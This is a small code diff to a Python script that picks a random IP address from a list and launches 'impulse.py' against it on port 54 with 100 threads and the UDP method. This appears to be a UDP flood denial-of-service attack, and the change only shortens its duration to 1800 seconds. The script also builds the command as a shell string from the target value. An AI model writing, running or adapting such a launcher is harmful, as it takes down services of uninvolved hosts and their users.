@@ -7,7 +7,7 @@ if __name__ == "__main__":
         random_ip = data[random.randint(0,len(data))]['ip']
         print(random_ip)
         subprocess.run(
-            [f"python3 impulse.py --target {random_ip}:54 --time 100000 --threads 100 --method UDP"],
+            [f"python3 impulse.py --target {random_ip}:54 --time 1800 --threads 100 --method UDP"],
             check = True,
             shell = True
         )
